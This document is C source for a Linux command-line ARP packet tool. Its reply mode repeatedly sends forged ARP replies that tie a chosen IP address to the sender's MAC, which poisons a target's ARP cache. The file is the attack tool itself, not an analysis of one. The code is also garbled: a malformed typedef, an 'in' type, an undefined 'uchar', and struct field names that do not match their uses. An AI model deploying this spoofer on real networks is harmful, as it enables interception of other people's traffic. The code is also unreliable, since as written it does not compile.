#include<stdio.h>
#include<sys/socket.h>
#include<net/if.h>
#include<net/if_arp.h>
#include<linux/if_ether.h>
#include<linux/if_packet.h>
#include<sys/ioctl.h>
#include<strings.h>
#include<string.h>
#include<unistd.h>
#include<arpa/inet.h>
#include<stdlib.h>

typedef eth_her
{
	u_char h_dest[6];		//destination addr
	u_char h_source[6];		//source addr
	u_short h_protocol;		//packet type
}__attribute__((packed));//#pragma pack(1)

static const int ETHERNET_SIZE = sizeof(struct eth_hdr);

struct arp_hdr
{
	u_short ar_hardware;		//hardware type ethernet 0x00 0x01
	u_short ar_protocol;		//protocol type IPv4	 0x00 0x04
	u_char	ar_hardware_length;	//hardware length ethernet 0x06
	u_char	ar_protocol_length;	//protocol length IPv4	0x04
	u_short ar_operation_code;	//operation code;
	u_char	ar_send_MAC[6];		//sender MAC
	u_char	ar_send_IP[4];		//sender IP
	u_char	ar_target_MAC[6];	//target MAC
	u_char	ar_target_IP[4];	//target IP
}__attribute__((packed));

static const in ARP_SIZE = sizeof(struct arp_hdr);

static uchar g_buf[sizeof(struct eth_hdr)+sizeof(struct arp_hdr)];
static const char * g_source_ip = NULL;
static const char * g_interface = NULL;
static int g_sock = -1;

// dumps raw memory in hex byte and printable split format
void dump(const uchar *data_buffer, const unsigned int length) {
	uchar byte;
	unsigned int i, j;
	for(i=0; i < length; i++) {
		byte = data_buffer[i];
		printf("%02x ", data_buffer[i]);  // display byte in hex
		if(((i%16)==15) || (i==length-1)) {
			for(j=0; j < 15-(i%16); j++)
				printf("   ");
			printf("| ");
			for(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line
				byte = data_buffer[j];
				if((byte > 31) && (byte < 127)) // outside printable char range
					printf("%c", byte);
				else
					printf(".");
			}
			printf("\n"); // end of the dump line (each line 16 bytes)
		} // end if
	} // end for
}


// get interface mac addr.
//  exam) interface2mac("eth0", buf);
// return : 1 success
//        : 0 failure
int interface2mac(const char * interface, uchar * mac)
{
	int fd = socket(PF_INET, SOCK_STREAM, 0);
	if(fd == -1)
	{
		perror("socket");
		return 0;
	}

	struct ifreq iflist;
	bzero(&iflist, sizeof(iflist));
	strncpy(iflist.ifr_name, interface, sizeof(iflist.ifr_name));
	if(ioctl(fd, SIOCGIFHWADDR, &iflist) == -1)
	{
		perror("ioctl failed");
		return 0;
	}
	
	struct sockaddr * sa = &iflist.ifr_hwaddr;
	memcpy(mac, sa->sa_data, 6);

	close(fd);

#ifdef _DEBUG
	printf("interface2mac: %s\n", interface);
	dump(mac, 6);
#endif // _DEBUG
	return 1;
}

// get mac address to arp cash.
//  exam) get_arp_to_arpcash(ip)
// return : 1 success
//        : 0 failure
int get_arp_to_arpcash(unsigned long ip)
{
	int fd = 0;
	if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return 0;

	struct sockaddr_in sin;
	bzero(&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip;
	sin.sin_port = htons(67);

	int i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));

	close(fd);

	return (i == 0);
}

// get MAC address from ip, interface
//  exam) arp_cash_lookup("eth0", ip, buf)
// return : 1 success
//        : 0 failure
int arp_cash_lookup(const char * interface, unsigned long ip, uchar * mac)
{
	int sock = 0;
	struct arpreq	ar;
	struct sockaddr_in * sin = 0;

	bzero(&ar, sizeof(ar));

	strncpy(ar.arp_dev, interface, sizeof(ar.arp_dev));
	sin = (struct sockaddr_in *)&ar.arp_pa;
	sin->sin_family = AF_INET;
	sin->sin_addr.s_addr = ip;

	if((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
		return 0;

	if(ioctl(sock, SIOCGARP, (caddr_t)&ar) == -1)
	{
		close(sock);
		return 0;
	}
	close(sock);
	memcpy(mac, ar.arp_ha.sa_data, 6);

	return 1;
}

// string to mac address
//  exam) "01:02:03:0d:0e:0f" --> "\x01\x02\0x03\x0d\x0e\x0f"
// return : 1 success
//        : 0 failure
int str2mac(const char * str_mac, uchar * mac)
{
	int ret = sscanf(str_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
			&mac[0], &mac[1], &mac[2],
			&mac[3], &mac[4], &mac[5]);

#ifdef _DEBUG
	int i = 0;
	printf("MAC : ");
	for(i = 0 ; i < 6 ; ++i)
		printf("%hhx:", mac[i]);

	printf("\n");
#endif // _DEBUG

	return ret;
}

// string to ip.
//  exam) "192.168.0.1" --> "\xc0\xa8\x00\x01"
// return : 1 success
//        : 0 failure
int str2ip(const char * str_ip, uchar * ip)
{
	int ret = sscanf(str_ip, "%hhu.%hhu.%hhu.%hhu",
			&ip[0], &ip[1], &ip[2], &ip[3]);

#ifdef _DEBUG
	int i = 0;
	printf("IP : ");
	for(i = 0 ; i < 4 ; ++i)
		printf("%hhu.", ip[i]);
	printf("\n");
#endif // _DEBUG
	return ret;
}

// convert ip to mac address
//  exam) ip2mac("eth0", "192.168.0.10", buf);
// return : 1 success
//        : 0 failure
int ip2mac(const char * intf, const char * str_ip, uchar * mac)
{
	int i = 0;
	unsigned int ip = 0;
	if(str2ip(str_ip, (uchar *)&ip) == 0)
		return 0;

	do
	{
		if(arp_cash_lookup(intf, ip, mac) == 1)
		{
#ifdef _DEBUG
			printf("ip2mac: %s\n", str_ip);
			dump(mac, 6);
#endif // _DEBUG
			return 1;
		}
		get_arp_to_arpcash(ip);

		sleep(1);
	}
	while(i++ < 3);

	return 0;
}

// init arp packet.
void init_packet(struct eth_hdr * e, struct arp_hdr * a, int reply)
{
	bzero(e, sizeof(*e));
	memset(e->h_dest, 0xff, sizeof(e->h_dest));
	e->h_proto = htons(0x0806);	// ARP protocol

	bzero(a, sizeof(*a));
	a->ar_hrd = htons(0x0001);	// Ethernet 10/100Mbps.
	a->ar_pro = htons(0x0800);	// IP protocol
	a->ar_hln = 6;				// hardware len
	a->ar_pln = 4;				// protocol len

	if(reply == 1)
		a->ar_op = htons(0x0002);	// 1 :request, 2 :reply
	else
		a->ar_op = htons(0x0001);	// 1 :request, 2 :reply

#ifdef _DEBUG
	printf("init_packet Ethernet Header:\n");
	dump((uchar *)e, sizeof(*e));

	printf("init_packet ARP Header:\n");
	dump((uchar *)a, sizeof(*a));
#endif // _DEBUG
}


// create rawsocket.
//  exam) rawsocket("eth0")
// return -1 : failure.
//        0 <= : success.
int rawsocket(const char * interface)
{
	int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(fd == -1)
	{
		perror("socket create:");
		return -1;
	}

	struct ifreq ifr;
	bzero(&ifr, sizeof(ifr));

	// select network interface ex) "eth0"
	strcpy((char *)ifr.ifr_name, interface);
	if(ioctl(fd, SIOCGIFINDEX, &ifr) == -1)
	{
		perror("error getting interface index\n");
		close(fd);
		return -1;
	}

	struct sockaddr_ll	sll;

	bzero(&sll, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);

	if(bind(fd, (struct sockaddr*)&sll, sizeof(sll)) == -1)
	{
		perror("Error binding raw socket to interface\n");
		close(fd);
		return -1;
	}

	return fd;
}

void sig_cleanup(int signo)
{
	printf("clean up\n");

	struct eth_hdr * ether = (struct eth_hdr *)g_buf;
	struct arp_hdr * arp = (struct arp_hdr *)(g_buf+ETHERNET_SIZE);

	uchar source_mac[6] = { 0, };
	if(g_sock != -1 && ip2mac(g_interface, g_source_ip, source_mac) == 1)
	{
		// set source mac to original mac address
		memcpy(ether->h_source, source_mac, 6);
		memcpy(arp->ar_sha, source_mac, 6);
		
		int i = 0;
		for(i = 0 ; i < 3 ; ++i)
		{
			write(g_sock, g_buf, ETHERNET_SIZE+ARP_SIZE);
			sleep(1);
		}

		close(g_sock);
	}

	exit(0);
}

void usage()
{
	printf( "au [-r] -i <ethernet interface> -t <target ip> <source ip>\n"
			"  exam) au -i eth0 192.168.0.10 192.168.0.5 : ARP REQUEST\n"
			"        au -r -i eth0 192.168.0.10 192.168.0.1 : ARP REPLY\n");
	exit(1);
}

// au -i eth0 -t 192.168.0.10 192.168.0.1
int main(int argc, char * argv[])
{
	const char * target_ip = NULL;
	int	reply = 0;			// ARP reply

	g_interface = "eth0";
	int c = 0;
	while((c = getopt(argc, argv, "ri:t:")) != -1)
	{
		switch(c)
		{
		case 'i':
			g_interface = optarg;
			break;
		case 't':
			target_ip = optarg;
			break;
		case 'r':	// ARP REPLY
			reply = 1;
			break;
		default:
			usage();
		}
	}

	argc -= optind;
	argv += optind;

	if(argc != 1)
		usage();

	g_source_ip = argv[0];
	
	bzero(g_buf, sizeof(g_buf));

	struct eth_hdr * ether = (struct eth_hdr *)g_buf;
	struct arp_hdr * arp = (struct arp_hdr *)(g_buf+ETHERNET_SIZE);

	init_packet(ether, arp, reply);

	if(interface2mac(g_interface, ether->h_source) == 0 ||
			ip2mac(g_interface, target_ip, ether->h_dest) == 0 ||
			str2ip(g_source_ip, arp->ar_sip) == 0 ||
			str2ip(target_ip, arp->ar_tip) == 0)
	{
		usage();
	}

	if(reply)
	{
		// ether->h_source == my mac		OK
		// ether->h_dest == target mac		OK
		// arp->ar_sha == my mac
		memcpy(arp->ar_sha, ether->h_source, sizeof(arp->ar_sha));

		// arp->ar_sip == source ip		OK
		// arp->ar_tha == target mac
		memcpy(arp->ar_tha, ether->h_dest, sizeof(arp->ar_tha));

		// arp->ar_tip == target ip			OK
	}
	else
	{
		// ether->h_source == my mac		OK
		// ether->h_dest == "\xff\xff\xff\xff\xff\xff"
		memset(ether->h_dest, 0xff, 6);

		// arp->ar_sha == my mac
		memcpy(arp->ar_sha, ether->h_source, sizeof(arp->ar_sha));

		// arp->ar_sip == my ip				OK source ip is my ip
		// arp->ar_tha == "\x00\x00\x00\x00\x00\x00"
		memset(arp->ar_tha, 0, 6);
		// arp->ar_tip == target ip			OK

		signal(SIGINT, &sig_cleanup);
	}

#ifdef _DEBUG
	printf("Ethernet Header:\n");
	dump((uchar *)ether, sizeof(*ether));

	printf("ARP Header:\n");
	dump((uchar *)arp, sizeof(*arp));
#endif // _DEBUG

	// create rawsocket
	g_sock = rawsocket(g_interface);
	if(g_sock == -1)
		return 1;

	for(;;)
	{
		putchar('.'); fflush(stdout);
		if(write(g_sock, g_buf, ETHERNET_SIZE+ARP_SIZE) < 1)
		{
			perror("write");
			break;
		}

		if(reply != 1)
			break;

		sleep(2);
	}

	close(g_sock);

	return 0;
}




